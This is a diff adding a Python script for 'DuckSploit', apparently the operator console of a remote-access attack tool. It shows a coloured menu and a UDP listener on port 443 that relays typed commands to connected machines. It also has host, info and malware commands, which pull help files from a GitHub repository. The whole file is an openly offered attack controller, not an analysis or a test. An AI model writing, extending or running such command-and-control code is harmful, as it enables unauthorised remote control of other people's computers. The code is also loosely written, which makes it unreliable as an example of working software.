@@ -1,0 +1,97 @@
+from socket import *
+from time import ctime
+import os
+from colorama import Fore
+import requests
+
+HOST = '192.168.1.47'
+PORT = 443
+BUFSIZE = 1024
+ADDR = (HOST,PORT)
+
+while True:
+    os.system("cls")
+    os.system("clear")
+    print(" ")
+    print(Fore.GREEN + "        dP                   dP                         dP          oo   dP   ")
+    print("        88                   88                         88               88   ")
+    print("  .d888b88 dP    dP .d8888b. 88  .dP  .d8888b. 88d888b. 88 .d8888b. dP d8888P ")
+    print("  88'  `88 88    88 88'  `\"\" 88888\"   Y8ooooo. 88'  `88 88 88'  `88 88   88   ")
+    print("  88.  .88 88.  .88 88.  ... 88  `8b.       88 88.  .88 88 88.  .88 88   88   ")
+    print("  `88888P8 `88888P' `88888P' dP   `YP `88888P' 88Y888P' dP `88888P' dP   dP   ")
+    print("                                               88                              ")
+    print("                                               dP                              ")
+    print("                            | DuckSploit V1.0.8 |                         ")
+    print("")
+    print(Fore.YELLOW + '    [' + Fore.RED + '1' + Fore.YELLOW + '] Wait')
+    print(Fore.YELLOW + '    [' + Fore.RED + '2' + Fore.YELLOW + '] Open chat')
+    print(Fore.YELLOW + '    [' + Fore.RED + '3' + Fore.YELLOW + '] Visit our website')
+    print(Fore.YELLOW + '    [' + Fore.RED + '4' + Fore.YELLOW + '] Exit')
+    print(" ")
+    menu = input(Fore.GREEN + "Choose option [1,2,3,4]: ")
+
+    if menu == "1":
+        udpSerSock = socket(AF_INET,SOCK_DGRAM)
+        udpSerSock.bind(ADDR)
+        print(Fore.RED + "Waiting for connection..." + Fore.RESET)
+        while True:
+            data,ADDR = udpSerSock.recvfrom(BUFSIZE)
+            #if data is None:
+            #    break
+	
+ 	    #item1 = ":"
+  	    #item2 = ">> "
+  	    #list1 = [ADDR[0],item1,ADDR[1],item2,data]
+            
+            data = data.decode("utf-8")
+            
+            
+            print(data[:-1])
+   	    # print(ADDR[0]":\033[1;32"ADDR[1] "\033[1;33>> " data)
+            send_data = input(Fore.GREEN + "DS> " + Fore.RESET)
+            if send_data is not None:
+                bytes = str.encode(send_data)
+                udpSerSock.sendto(bytes,(ADDR[0],ADDR[1])) 
+    
+            ### COMMANDS
+            send_data = send_data.split()
+    
+            if send_data[0] == "exit":
+                exit()
+            elif send_data[0] == "host":
+                print("Downloading hosting files...")
+                os.system("python -mwebbrowser http://" + ADDR[0] + ":8080")
+            elif send_data[0] == "info":
+                print(ADDR[0],':',ADDR[1])
+            elif send_data[0] == "clear":
+                os.system("clear")
+            elif send_data[0] == "help":
+                url = requests.get("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/help.txt")
+                htmltext = url.text
+                print(Fore.GREEN + htmltext + Fore.RESET)
+                continue
+            elif send_data[0] == "credits":
+                url = requests.get("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/credits.txt")
+                htmltext = url.text
+                print(Fore.GREEN + htmltext + Fore.RESET)
+            elif send_data[0] == "malware":
+                try:
+                    if send_data[1] == "--help":
+                        url = requests.get("https://github.com/canarddu38/DUCKSPLOIT/raw/root/api/malwares/malwarehelp.txt")
+                        htmltext = url.text
+                        print(Fore.GREEN + htmltext + Fore.RESET)
+                except:
+                    pass
+        udpSerSock.close()
+    elif menu == "2":
+        print("CHAT WILL BE ADDED SOON ;)") 
+        break
+    elif menu == "3":
+        os.system("python -mwebbrowser http://canarddu38.github.io/DUCKSPLOIT")
+        break
+    elif menu == "4":
+        exit()
+    else:
+        os.system("cls")
+        os.system("clear")
+        print(Fore.RED + "Invalid Option (only 1,2,3 or 4)..." + Fore.RESET)
